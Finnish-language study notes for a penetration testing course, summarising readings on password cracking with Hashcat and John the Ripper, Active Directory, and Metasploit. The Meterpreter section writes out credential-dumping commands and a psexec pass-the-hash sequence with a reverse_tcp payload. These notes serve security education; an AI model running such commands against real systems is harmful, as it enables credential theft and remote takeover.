# Kotitehtävät

Kotitehtävät ovat kurssilta "Tunkeutumistestaus - Penetration Testing course" ja löytyvät osoitteesta https://terokarvinen.com/tunkeutumistestaus/.

Kotitehtävät on tehty Windows 11 - Home - käyttöjärjestelmällä, päivitykset ajettu 22/04/2025 asti.

AMD Ryzen 5 4500U, RAM 8 Gt.

Aika: Itä-Euroopan normaaliaika Aikavyöhyke: Suomi (UTC+3) 22/04/2025 (pvm/kk/v)

Kaikissa testaukseen liittyvässä: Oracle VM VirtualBox ja Kali Linux Point release live image (2025.1a)


## x) Lue/katso ja tiivistä. (Tässä x-alakohdassa ei tarvitse tehdä testejä tietokoneella, vain lukeminen tai kuunteleminen ja tiivistelmä riittää. Tiivistämiseen riittää muutama ranskalainen viiva kustakin artikkelista. Kannattaa lisätä myös jokin oma ajatus, idea, huomio tai kysymys.)

### [Karvinen 2022: Cracking Passwords with Hashcat](https://terokarvinen.com/2022/cracking-passwords-with-hashcat/)

- Hashcat kokeilee siis joka sanan jostain sanalistasta ja kertoo, jos se saa "osuman"

```
sudo apt-get -y install hashid hashcat wget
mkdir hashed
cd hashed
```

- Haetaan joku valmis sanalista tai tehdään itse. SecList on hyvä

```
$ wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz
$ tar xf rockyou.txt.tar.gz
$ rm rockyou.txt.tar.gz
```

- Hashcatille pitää antaa tyyppi, jonka se yrittää löytää. ```hashid -m 'id'```
- hashcat = ohjelma
- -m 0 = hashin tyyppi
- 7bhdsifjisjdfiisjifs3141-> Hash, joka halutaan auki -> Käytettävä ' alussa ja ' lopussa
- -o solved = tallenna plain textinä uuteen "solved" - hakemistoon ja -- show = näkee suoraan, jos tulee osuma




### [Karvinen 2023: Crack File Password With John](https://terokarvinen.com/2023/crack-file-password-with-john/)

- John the Ripperillä saa auki encryptattuja salasanoja käyttämällä sanalistahyökkäystä 'dictionary attack'
- Tarvitaan kaikki kirjastot ja työkalut

```
$ sudo apt-get update
$ sudo apt-get -y install micro bash-completion git build-essential libssl-dev zlib1g zlib1g-dev zlib-gst libbz2-1.0 libbz2-dev atool zip wget
```

- Jotta säästyy aikaa, ladataan Jumbo versio ja käytetään ```-depth=1```, joka kopioi vain uusimmat versiot

```git clone --depth=1 https://github.com/openwall/john.git```

- Useammat Linux C ja C++ ohjelmat ./configure && make

```
cd john/src/
./configure
```

```make -s clean && make -sj4```

- Zipfilen avaaminen kaksivaiheinen: ensin extractataan hash uuteen tiedostoon

```
$HOME/john/run/zip2john tero.zip >tero.zip.hash
```

- Jonka jälkeen pyöräytetään John käyntiin

```
$HOME/john/run/john tero.zip.hash
```


### € [Santos et al 2017: Security Penetration Testing - The Art of Hacking Series LiveLessons: Lesson 6: Hacking User Credentials (8 videos, about 30 min)](https://www.oreilly.com/videos/security-penetration-testing/9780134833989/9780134833989-sptt_00_06_00_00/)

- Useimmiten käyttäjätiedot tallennetaan tietokantaan, tekstitiedostoon, SQL - tietokantaan, omiin tietokantoihin (AD)
- Miten siltä suojaudutaan? Kaksi tapaa: Pitää suojata ne verkon yli lähetettäessä ja tallennettaessa -> Niiden suojaus. Tavallisella käyttäjällä pitkät salasanat, multi-factor authentication
- Ihmisten laiskuudesta sakotetaan -> Yksi salasana usein käy muihin käyttäjiin
- Useimmilla "Free Wi-Fi" - paikoilla, esimerkiksi ravintoloilla ei ole minkäänlaista suojausta liikenteen sisällä. Sniffaus ja  MITM - hyökkäykset siis helppoja. VPN!
- Jos kaikki muu menee mönkään -> Bruteforce! Työkaluja: Medusa, THC-Hydra, Brutus, Metasploit, Dirtbuster, wfuzz

- Hashing -> Yksisuuntainen hashaus ei ole salaamista, se voi suojata salasanoja, ei mahdollista peruuttaa, laskettu nopeasti, käytä aina salttia
- Foo -> MID5 (hash - funktio) -> hashattu versio
- Helppo tapa: echo "Foo" | sha256sum -> 949i032489ujirmlrkejflödsfkjsdf
- Jos sen ajaa uudestaan, saa saman tuloksen ELLEI sitä ole muokattu. Esim "Foo1" muokkaa hashiä

- Miksi salasanoja on helppo avata? CPUt ja niiden nopeus kehittyy jatkuvasti, heikot algoritmit, sanalistat on kehittyneet ja erittäin kattavia aikaisemmista vuodoista, "rainbow tables"
- Summa summarum = Windows tarvitsee Saltin

- John the Ripper -> john [OPTIONS] [PASSWORD-FILES]
- LM hashes jakaa salasanan kahden 7 merkin salasanaan, John näyttää kumman puolen se sai auki ja näyttää kaikki isoina kirjaimina "FOO"
- NT kaikki pienellä "foo" -> Tarvitsee NT kirjautumiseen
- john.rec -> Missä kohtaa lopetit -> john.pot = kaikki kräkätyt salasanat

- Parempaa suojausta = Multi auth, vahva salasana joka paikassa, saltin käyttö, ei pelkästään hash - algoritmejä, sertificate based auth, parempi randomointi!

### € [Kennedy et al 2025: Metasploit: File-Format Exploits (sivun loppuun, eli Wrapping Up loppuun)](https://www.oreilly.com/library/view/metasploit-2nd-edition/9798341620032/xhtml/chapter9.xhtml#:-:text=File-Format%20Exploits)

- File-format bugit on haavoittuvuuksia tiedoston luku - ohjelmissa, kuten Adobe PDF - readerissa. Se perustuu siihen, että käyttäjä avaa jonkun haittaohjelman haavoittuneessa sovelluksessa.
- Pätee käytännössä mihin tahansa -> Word, PDF, image jne.
- Tässä siis hyödynnettiin "a remote code execution vulnerabilityä" Windows MSHTML selainenginessä, jota pystyi hyödyntää käyttäen Wordidokumentteja


### € [Singh 2025: The Ultimate Kali Linux Book: Understanding Active Directory (Vain tuo kappale, ei enää "Enumerating Active Directory")](https://learning.oreilly.com/library/view/the-ultimate-kali/9781835085806/Text/Chapter_12.xhtml#_idParaDest-272)

*AD*
- Active Directory helpottaa käyttäjien hallitsemista keskitetysti -> Käyttäjät, ryhmät, laitteet ja käytännöt
- Puhutaan "Domain Controllerina" 
- Se mahdollistaa käyttäjän luomisen, security grouppiin asettamisen ja tehdä Group Policy Object, joka asettaa käyttäjille ja ryhmille security policyja domainissa.
- Mahdollistaa kirjautumisen laitteille domainiin käyttäen domain - käyttäjää sen sijaan, että käyttäisi paikallista käyttäjää, joka on tallennettu eristetylle tietokoneelle
- Hallinnointi ja turvallisuusominaisuudet -> Käyttäjäporifiilien hallinta asiakkailla ja servereillä domainissa, verkkoinformaatio ja konfiguraatiot, keskitetty security policyt käyttäjille, laitteille ja ryhmille, asiakasrekisterin konfiguraatiot ja käytännöt "policies"
- Tätä lukiessa mietin jatkuvasti, kuinka vakavasta asiasta on kyse jos jollain ulkopuolisella olisi sinne pääsy

*Forests*
- Sen aloittaminen -> Pitää luoda "forest", joka määrittelee loogisen turvallisuuden rajat edellämainittujen asioiden hallinnoimiseen.
- Foresteissa voi olla monia domainia. Domain on Organizational Units - muodostama kokonaisuus, jonka avulla objekteja hallinnoidaan.
- Forest = Kokoelma yhdestä tai useasta domainista, jotka jakaa yhteiset konfiguraatiot, mallit ja globaalit luettelot
- OU sisään voi laittaa esimerkiksi -> Users, Computers, Groups, OUs, Printers, Shared Folders = Esimeskiksi kaikkien Markkujen tiedostot samaan kansioon

*Trust*
- One-way trust -> Käyttäjä tietystä luotetusta domainista pääsee käsiksi toisen luotetun domainin resursseihin, mutta ei toisinpäin Domain_A -> Domain_B, mutta Domain_B ei -> Domain_A
- Two-way trust -> Domain_A -> Domain_B ja Domain_B -> Domain_A
- Transitive trust -> Laajentaa aluetta, eli Domain_A pääsee Domain_B, josta pääsy Domain_C ja taaksepäin sama kaava
- Non-transitive trust -> Ei pääsyä muihin forest domaineihin
- Forest trust -> Luodaan forest root domainin kahden forestin välille

*Domain log in process* 
1. Hosti lähettää käyttäjän domain käyttäjänimen New Technology LAN Manager (NTML) version 2 hashin käyttäjän salasanasta validoidakseen sen käyttäjän identiteetin
2. Domain controller määrittelee, onko käyttäjän tiedot oikein
3. Vastaa hostille määärittäen, mitä turvallisuuskäytäntöjä käyttäjälle asetetaan -> Käyttäjä, jolla on verkkotunnus voi kirjautua mihin tahansa verkon laitteeseen, jos turvakäytännöt vain sen sallivat

- Paikalliset käyttäjätiedot tallennetaan W10/11 ```C:\Windows\System32\config``` SAM (Security Account Management) - tiedostoon, jossa käyttäjänimi plaintextinä ja salasana NTLM versio 1 hash tallannettu SAM - tiedostoon.

### € [Vapaaehtoinen: Kennedy et al 2025: Metasploit: Basic Meterpreter Commands](https://learning.oreilly.com/library/view/metasploit-2nd-edition/9798341620032/xhtml/chapter6.xhtml#toc-link_85)

- Käyttäjän työpöytä screenshot ```meterpreter > screenshot```
- Alustainfot ```meterpreter > sysinfo```
- Keylog ```meterpreter > ps explorer```
- LM ei niin turvallinen, NTLM - protocolla huomattavasti turvallisempi! Vain single hash. Sen takia siis, että 7 - merkkiä on nopeampi ja vähemmän kuormittavampi aukaista, kun 14 - kirjainta
- Lataa Meterprere's privilege extension, joka voi dumpata SAM - tietokannan, joka sisältä käyttänätunnukset ja salasanat ```meterpreter > use priv```
- Hakee kaikki käyttäjätunnukset ja hashatut salasanat ```meterpreter > run post/windows/gather/smart_hashdump```

*pass-the-hash*
- Hyväksyy salasanan ilman, että se tarkistaa tietääkö lägettäjä salasanan
- Kuka tahansa voi esittää tiettyä käyttäjää sen salasanalla

```
msf > use exploit/windows/smb/psexec```
msf exploit(psexec)> set PAYLOAD windows/meterpreter/reverse_tcp
msf exploit(psexec)> set LHOST 192.168.1.100
msf exploit(psexec)> set LPORT 443
msf exploit(psexec)> set RHOST 192.168.1.102
msf exploit(windows/smb/psexec) > set SMBUser Administrator
msf exploit(psexec)> set SMBPass  aad3b435b51404eeaad3b435b51404ee: e02bc503339d51f71d913c245d35b50b
SMBPass => aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b msf exploit(psexec)> exploit
```
Tässä siis vain esimerkistä saatu rakenne. Nuo komennot muuntuu hieman sitten tilanteiden mukaan

*Mimikatz ja Kiwi*
- Kiwi on siis moduuli Metasploitissa
- Sillä voi esim. juksuttaa domain controllereita verkossa jakamaan kaikki käyttäjätiedot
- Mimikatz hakee kaikki paikat, joissa salasanat usein on tallennettu, kiinnittyy prosessiin debuggerina ja yrittää extractata käyttäjän ja salasanan

- Tässä on siis erittäin hyviä komentoja ja Meterpreterin käyttöä ihan käytännön harjoituksilla. Sen verran pitkä teksti, ettei kaikkea edes kannata tiivistää
- Näyttää sen verran mielenkiintoiselta, että ajattelin kokeilla tuota sikälimikäli jossain kohtaa riittää aika siihen

## Lähteet: 

Cracking Passwords with Hashcat, Karvinen 2022, Luettavissa: https://terokarvinen.com/2022/cracking-passwords-with-hashcat/, Luettu 22/04/2025

Cracking File Password With John, Karvinen 2022, Luettavissa: https://terokarvinen.com/2023/crack-file-password-with-john/

€ Security Penetration Testing - The Art of Hacking Series LiveLessons: Lesson 6: Hacking User Credentials (8 videos, about 30 min), Santos et al 2017, Katsottavissa: https://learning.oreilly.com/videos/security-penetration-testing/9780134833989/9780134833989-sptt_00_06_00_00, Katsottu 21/04/2025

€ Metasploit: File-Format Exploits (sivun loppuun, eli Wrapping Up loppuun), Kennedy et al 2025, Luettavissa: https://learning.oreilly.com/library/view/metasploit-2nd-edition/9798341620032/xhtml/chapter9.xhtml#:-:text=File-Format%20Exploits

€ The Ultimate Kali Linux Book: Understanding Active Directory (Vain tuo kappale, ei enää "Enumerating Active Directory"),  Singh 2025, Luettavissa: https://learning.oreilly.com/library/view/the-ultimate-kali/9781835085806/Text/Chapter_12.xhtml#_idParaDest-272, Luettu 21/04/2025

€ Metasploit: Basic Meterpreter Commands, Kennedy et al 2025, Luettavissa: https://www.oreilly.com/library/view/metasploit-2nd-edition/9798341620032/xhtml/chapter6.xhtml#toc-link_85, Luettu 21/04/2025




